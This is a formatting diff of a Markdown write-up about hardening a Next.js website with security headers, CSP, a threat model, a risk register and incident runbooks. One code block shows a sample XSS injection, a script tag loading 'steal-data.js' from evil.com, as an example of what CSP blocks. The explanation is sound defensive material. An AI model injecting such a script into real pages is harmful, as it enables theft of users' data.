@@ -11,7 +11,7 @@ tags:
     bundle,
     speed-insights,
     analytics,
-    stage-4-4
+    stage-4-4,
   ]
 ---
 
@@ -21,15 +21,15 @@ Security Posture Deepening is about adding multiple layers of security to the we
 
 It's not flashy features—it's about proving you think like a security-minded engineer.
 
-
 ### 1. Browser-Level Security Headers
 
 Added invisible instructions that tell browsers to enforce security rules:
+
 ```
 X-Frame-Options: DENY
 → "Don't let anyone embed this website in a sneaky iframe"
 
-X-Content-Type-Options: nosniff  
+X-Content-Type-Options: nosniff
 → "Trust the file type I tell you, don't guess"
 
 Referrer-Policy: strict-origin-when-cross-origin
@@ -46,12 +46,13 @@ The main defense against XSS attacks. You told browsers:
 Block anything else, no matter how it tries to sneak in."`
 
 Real example of what it stops:
+
 ```js
 // Attacker tries to inject this:
 <script src="https://evil.com/steal-data.js"></script>
 
 // Browser checks CSP...
-// "Is evil.com whitelisted?" 
+// "Is evil.com whitelisted?"
 // NO? ❌ BLOCKED
 ```
 
@@ -62,6 +63,7 @@ Real example of what it stops:
 - `next.config.ts`: Documented why each security header exists
 
 ## Documentation
+
 ### 1. Threat Model v2
 
 Extended your threat model to ask: "What could go wrong at deployment time or runtime?"
@@ -77,12 +79,12 @@ Examples:
 
 A spreadsheet tracking 8 known security risks:
 
-| Risk | Severity |	Mitigation | Status |
-| - | - | - | - |
-|Malicious npm package|High|Scan weekly, update within 48h|Mitigated|
-|Secrets accidentally logged|Critical|Structured logging, secret scanning|Mitigated|
-|CSP can be bypassed with `unsafe-inline`|Medium|Acceptable tradeoff; upgrade path planned|Accepted|
-|Vercel gets hacked|Critical|We can't prevent; trust Vercel's security|Accepted|
+| Risk                                     | Severity | Mitigation                                | Status    |
+| ---------------------------------------- | -------- | ----------------------------------------- | --------- |
+| Malicious npm package                    | High     | Scan weekly, update within 48h            | Mitigated |
+| Secrets accidentally logged              | Critical | Structured logging, secret scanning       | Mitigated |
+| CSP can be bypassed with `unsafe-inline` | Medium   | Acceptable tradeoff; upgrade path planned | Accepted  |
+| Vercel gets hacked                       | Critical | We can't prevent; trust Vercel's security | Accepted  |
 
 **What this shows:** You don't pretend risks don't exist. You document them, decide if they're acceptable, and explain why.
 
@@ -98,6 +100,7 @@ Formal procedures for:
 ### 4. Dependency Vulnerability Runbook
 
 Step-by-step guide: "If we get a security alert about npm packages, here's what to do":
+
 ```
 1. Triage (1 hour): How bad is it?
 2. Remediation (1-2 hours): Fix it or accept the risk
@@ -114,6 +117,7 @@ With MTTR targets:
 ### 5. Security Hardening Guide
 
 Explains CSP in detail:
+
 - Why you need it (prevents XSS)
 - The trade-off (`unsafe-inline` is necessary for Next.js but weakens security)
 - The upgrade path (future: use script hashes instead)
@@ -121,14 +125,15 @@ Explains CSP in detail:
 
 ## Rationale
 
-|Without Security Posture|With Security Posture|
-|-|-|
-|"Here's my website"|"Here's my website WITH documented security controls"|
-|No security discussion|OWASP headers, CSP policy, threat model, risk register|
-|Hopes nothing breaks|Has runbooks for when things break|
-|"Security is important"|Proves it with code and documentation|
+| Without Security Posture | With Security Posture                                  |
+| ------------------------ | ------------------------------------------------------ |
+| "Here's my website"      | "Here's my website WITH documented security controls"  |
+| No security discussion   | OWASP headers, CSP policy, threat model, risk register |
+| Hopes nothing breaks     | Has runbooks for when things break                     |
+| "Security is important"  | Proves it with code and documentation                  |
 
 ### Discussion
+
 **Q: "How do you approach security?"**
 
 - "I implement OWASP security headers to prevent XSS, clickjacking, and MIME attacks"
@@ -153,17 +158,15 @@ Explains CSP in detail:
 - ✅ Incident Readiness — Have documented procedures for when things break
 - ✅ Documentation Discipline — Explain your security thinking so others can review and trust it
 
-
 ## Project Goals
 
-|Goal|Solution|
-|-|-|
-|"Show I think like an enterprise engineer"|Document formal security policies, threat model, risk register|
-|"Prove I've solved real problems"|Show runbooks for dependency vulnerabilities and incident response|
-|"Demonstrate operational maturity"|Have MTTR targets and recovery procedures documented|
-|"Show I understand trade-offs"|Document why `unsafe-inline` CSP is necessary + upgrade path|
-|"Build credibility with security reviewers"|Have OWASP headers, CSP, threat model, and audit policies|
-
+| Goal                                        | Solution                                                           |
+| ------------------------------------------- | ------------------------------------------------------------------ |
+| "Show I think like an enterprise engineer"  | Document formal security policies, threat model, risk register     |
+| "Prove I've solved real problems"           | Show runbooks for dependency vulnerabilities and incident response |
+| "Demonstrate operational maturity"          | Have MTTR targets and recovery procedures documented               |
+| "Show I understand trade-offs"              | Document why `unsafe-inline` CSP is necessary + upgrade path       |
+| "Build credibility with security reviewers" | Have OWASP headers, CSP, threat model, and audit policies          |
 
 ## The Bottom Line
 
